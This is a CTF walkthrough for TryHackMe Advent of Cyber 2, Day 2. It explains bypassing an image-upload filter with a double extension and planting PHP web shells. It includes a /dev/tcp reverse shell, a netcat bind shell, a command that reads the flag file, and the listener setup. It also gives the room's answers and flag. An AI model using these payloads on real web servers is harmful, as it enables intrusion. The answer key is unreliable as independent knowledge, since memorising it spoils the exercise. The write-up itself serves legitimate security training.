# Day 2 - The Elf Strikes Back!

**Date:** 02, December, 2020

**Author:** Dhilip Sanjay S

---
## Reverse Shell
- Attack Box will be listening for incoming connection. The victim will connect back to the attack box (by some malicious script).
- In this example, the PHP script is used to create a reverse shell.

## Bind Shell
- A bind shell is created in the victim and binds to a specific port to listen for an incoming connection from the attack box.
---
## Solutions
### What string of text needs added to the URL to get access to the upload page?
- **Answer:** `?id=Your-ID`
---
### What type of file is accepted by the site?
- **Answer:** image
- **Steps to reproduce:** View source code. You can see that, it will accept files with following extensions:  `.jpg, .jpeg, .png` (which are image extensions).
---
### Bypass the filter and upload a reverse shell.
- To bypass the file upload extension filter: `your-file.(jpg|jpeg|png).php`
- The filter will check the extension after the first dot in the filename. This way, you can upload any file format. 

- Reverse shell is used to obtain the flag. 3 ways to obtain flag using PHP:
1. __Reverse Shell using the pre-written script__
    - Make a copy of the script: `/usr/share/webshells/php/php-reverse-shell.php` 
    - Replace `$ip` and `$port` in the script with your IP Address and the port on which your netcat is listening. 

2. __Reverse Shell using exec command__
    - To obtain Reverse shell without much complicated code.
    - And also netcat is not available in target.

    ```php
    <?php
    echo exec("/bin/bash -i > /dev/tcp/$ip/$port 0<&1 2>&1");
    ?>
    ```
    - **Note:** Replace `$ip` and `$port` with your IP Address and the port on which your netcat is listening.

> In the same way, **bind shell** can be established:
> ```php 
> <?php
> exec("nc -lp $port -e /bin/sh");
> ?>
> ```
> - But `nc` is not installed on the server. So, it is not possible in this case.
> - To connect to the bind shell, on the attack machine type the command: `nc $target_ip $port`.

3. __Print the flag directly__
    - We know that the flag is in the file `/var/www/flag.txt`. So, we can use PHP to directly fetch and display the flag for us.
    ```php
    <?php
    echo shell_exec("cat /var/www/flag.txt");
    ?>
    ```
---
### In which directory are the uploaded files stored?
- **Answer:** /uploads/
- Use `dirbuster` to find the folders.

---
### Activate your reverse shell and catch it in a netcat listener!
- To activate the reverse shell, go to the `/uploads/` directory and click on the file you uploaded.
- To listen to the reverse shell:
    ```bash
    sudo nc -lvnp $port
    ``` 
---
### What is the flag in `/var/www/flag.txt`?
-  **Answer:** THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}

---

## Reference Links
- [Netcat without netcat](https://www.youtube.com/watch?v=hZ6TjWuepqw)
- [IO redirection](https://tldp.org/LDP/abs/html/io-redirection.html)
- [Meaning of 2>&1 (STDERR to STDOUT)](https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean)

[Back to Advent of Cyber 2](/TryHackMe/Advent%20of%20Cyber%202) 